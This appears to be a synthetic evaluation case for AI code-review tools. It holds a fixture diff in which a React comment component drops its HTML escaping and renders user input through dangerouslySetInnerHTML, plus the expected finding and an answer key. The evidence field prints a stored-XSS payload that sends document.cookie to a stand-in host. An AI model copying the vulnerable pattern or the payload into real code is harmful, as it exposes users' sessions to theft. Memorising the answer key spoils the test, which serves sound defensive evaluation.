@@ -1,0 +1,58 @@
+{
+  "id": "C009",
+  "title": "User markdown rendered as raw HTML",
+  "stack": "typescript",
+  "change_class": "security",
+  "risk_class": "critical_positive",
+  "family_group": "G09",
+  "fixture": {
+    "kind": "trees",
+    "base": {
+      "src/components/Comment.tsx": "import React from \"react\";\n\nfunction escapeHtml(s: string): string {\n  return s.replace(/&/g, \"&amp;\").replace(/</g, \"&lt;\").replace(/>/g, \"&gt;\");\n}\n\nexport function Comment({ body }: { body: string }) {\n  return <div className=\"comment\" dangerouslySetInnerHTML={{ __html: escapeHtml(body) }} />;\n}\n"
+    },
+    "head": {
+      "src/components/Comment.tsx": "import React from \"react\";\n\n// render rich formatting (bold/links) requested by the community thread\nexport function Comment({ body }: { body: string }) {\n  return <div className=\"comment\" dangerouslySetInnerHTML={{ __html: body }} />;\n}\n"
+    },
+    "pr_metadata": {
+      "title": "Rich comment formatting",
+      "body": "Comments now render markdown-ish formatting directly.",
+      "deceptive": false
+    },
+    "revision_pin": "fixture:sha256:53d2297aebc213814c535a1ebe084938b064669c7fa90b1668dadb3a5ac662f7"
+  },
+  "labels": [
+    {
+      "id": "C009-d1",
+      "severity": "critical",
+      "path": "src/components/Comment.tsx",
+      "defect": "Stored XSS: unsanitized user markdown injected via dangerouslySetInnerHTML",
+      "evidence": "Reproducible: comment body <img src=x onerror=\"fetch('https://example.invalid/c?'+document.cookie)\"> executes in every viewer's session; escapeHtml was the only sanitizer and it was removed rather than replaced.",
+      "introduced_by_change": true,
+      "ambiguous": false,
+      "keywords": [
+        "dangerouslySetInnerHTML",
+        "escapeHtml",
+        "body"
+      ],
+      "window": 25
+    }
+  ],
+  "expected": {
+    "must_flag": [
+      "C009-d1"
+    ],
+    "must_not_flag": []
+  },
+  "adjudication": {
+    "status": "adjudicated",
+    "adjudicator": "independent-reviewer-v1",
+    "blind": true,
+    "verdict": "confirmed",
+    "notes": "Stored XSS: escapeHtml removed without replacement."
+  },
+  "rights": {
+    "origin": "original synthetic fixture authored for this corpus (repository MIT)",
+    "egress": "synthetic; no real secrets, hosts, or user data"
+  },
+  "schema": "ai-diff-reviewer/eval-case/1"
+}
